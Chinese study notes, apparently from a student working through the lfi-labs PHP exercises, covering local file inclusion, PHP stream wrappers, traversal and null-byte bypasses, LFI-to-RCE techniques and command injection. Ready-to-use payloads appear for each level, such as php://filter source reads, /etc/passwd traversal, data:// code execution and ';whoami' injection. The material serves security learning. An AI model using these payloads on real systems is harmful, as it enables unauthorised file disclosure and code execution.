# 06 · 文件包含 LFI + 命令注入（task6）

> 状态：✅ 已掌握（lfi-labs LFI-1~14 + CMD-1~6）

---

# 一、包含函数 vs 读取函数

## 包含函数（**会执行 PHP**）

| 函数 | 失败时 |
|---|---|
| `include` | 只 Warning，**脚本继续** |
| `require` | Fatal Error，**脚本停止** |
| `include_once` / `require_once` | 防重复包含 |

## 只读函数（**不执行**）

| 函数 | 返回 |
|---|---|
| `file_get_contents($f)` | 整个文件读成字符串 |
| `file($f)` | 数组，每行一个元素 |
| `readfile($f)` | 直接输出内容 |
| `fopen()` + `fread()` | 逐步读 |

**⭐ 核心区别**：**`include` 会执行 PHP；`file_get_contents` 只读文本。**

---

# 二、判断 payload 该写什么

```
① 看参数名（page / file / library / class / stylepath）→ 用哪个参数
② 看函数：include = 执行 / file_get_contents = 只读
③ 看加工（前缀/后缀/addslashes/str_replace/正则）→ 决定绕过
④ 没源码用黑盒：报错泄露路径、行为对比（差分）
⑤ 读源码渠道：本地开文件 / 本点 php://filter（无前缀）/ 借别的点（有前缀）
```

---

# 三、协议速查

| 协议 | 用途 |
|---|---|
| `file://` | 读本地文件（**不受限**）`file:///C:/Windows/win.ini` |
| `http://` / `https://` | 读远程/RFI（**include 需 `allow_url_include=1`**） |
| `php://filter` | ⭐ **读源码（不执行）** |
| `php://input` | 读 POST body（需 `allow_url_include=1`） |
| `php://memory` / `php://temp` | 内存/临时流 |
| `data://` | 内联数据（RCE 需 `allow_url_include=1`） |
| `phar://` | PHAR 反序列化 RCE |
| `zip://` | 读 zip 内文件：`zip://路径#内部` |
| `compress.zlib://` / `compress.bzip2://` | 压缩流 |
| `glob://` | 目录通配枚举 |
| `expect://` | 命令执行（需 expect 扩展） |

## php://filter 语法

```
php://filter/read=convert.base64-encode/resource=目标文件
```

| 部分 | 说明 |
|---|---|
| `read=` | 读过滤器（**用等号**） |
| `convert.base64-encode` | base64 编码滤镜 |
| `resource=` | 目标文件 |

**其他滤镜**：`string.rot13`、`convert.iconv.*`、多滤镜用 `|` 叠加。

**⭐ 为什么能读源码**：直接 include 会把源码当 PHP **执行**（看不到）；base64 滤镜把它**转成字符串输出**（不执行）。

---

# 四、关键开关

| 开关 | 影响 |
|---|---|
| `allow_url_include=0` | ❌ `php://input`、`data://`、`http://` RFI 不能 include 执行 |
| | ✅ **`php://filter` 不受限** |
| `allow_url_fopen` | 影响远程文件读取 |

---

# 五、lfi-labs 关卡速查

| 关卡 | 源码特征 | 绕过 |
|---|---|---|
| **LFI-1** | `include($_GET['page'])` 无过滤 | `?page=php://filter/read=convert.base64-encode/resource=index.php` |
| **LFI-2** | `include("includes/".$_GET['library'].".php")` | `library=../../../../etc/passwd%00`（**空字节截断**） |
| **LFI-3** | 非 `.php` 结尾才 `file_get_contents` | `file=file:///C:/Windows/win.ini` |
| **LFI-4** | `addslashes($_GET['class'])` + 后缀 | 空字节先被 `addslashes` 转成 `\0` |
| **LFI-5** | `str_replace('../','')` + `include("pages/$file")` | `file=....//....//....//Windows/win.ini` |
| **LFI-6~14** | GET→POST / 各种变体 | 同上，改传参方式 |

## 关键绕过原理

**① `%00` 空字节截断**
```
include("includes/" . $x . ".php")
输入 x = ../../../../etc/passwd%00
→ 路径变成 includes/../../../../etc/passwd\0.php
→ \0 后内容被丢弃 → 实际读 /etc/passwd
```
**⚠️ 需 PHP < 5.3.4 + Unix**（Windows 文件 API 不支持；新版 PHP 已修复）。

**② `....//` 绕 `str_replace('../','')`**
```
输入 ....//
str_replace 删掉中间的 ../  →  剩下 ../
→ 实现穿越 ✅
```

**③ `addslashes` 防 NUL**
```php
addslashes("\0")  →  "\0"（把 NUL 转成字面 \0）
→ 空字节先就没了，截断失效
```

---

# 六、LFI → RCE（进阶）

| 方法 | 说明 |
|---|---|
| `php://input` | POST body 当 PHP 执行（需 `allow_url_include=1`） |
| `data://` | `data://text/plain,<?php system('ls');?>`（需 `allow_url_include=1`） |
| **上传图片马 + include** | ⭐ 最常见 |
| **日志投毒** | 把木马写进 access.log，再 include 日志 |
| `/proc/self/environ` | 环境影响 |
| **session 文件** | 把木马写进 session，再 include |

---

# 七、命令注入（CMD）

## 基础

```php
system($_GET['cmd']);        // ?cmd=whoami
```

## 分隔符（断开固定前缀）

| 系统 | 分隔符 |
|---|---|
| **Unix** | `;` `&` `\|` |
| **Windows** | `&` `\|`（**`;` 无效**） |

## CMD 关卡

| 关卡 | 源码 | payload |
|---|---|---|
| **CMD-1** | `system($_GET['cmd'])` | `?cmd=whoami` |
| **CMD-2** | POST 版 | `curl -X POST -d "cmd=whoami"` |
| **CMD-3** | `system("whois " . $_GET['domain'])` | `?domain=example.com;whoami` |
| **CMD-4** | POST 版 | 同上 |
| **CMD-5** | `preg_match(域名正则, domain)` + `system("whois -h ".$server." ".$domain)` | `?domain=example.com&server=x;whoami%20%23` |
| **CMD-6** | POST 版 | 同上 |

**⭐ CMD-5 的精髓**：**检查的字段（domain）和用进命令的字段（server）不一致** —— domain 骗过正则，server 注命令。

**⚠️ CMD-3~6 本机打不了**：环境**没装 whois**，固定前缀失败 → 命令中断。

---

# 八、一句话

> **include 执行、file_get_contents 只读**。**`php://filter/read=convert.base64-encode/resource=xxx` 读源码**。**`....//` 绕 `str_replace('../')`**。**`%00` 截断需旧版 PHP+Unix**。**命令注入用 `;`（Unix）/ `&`（Windows）断开前缀**。
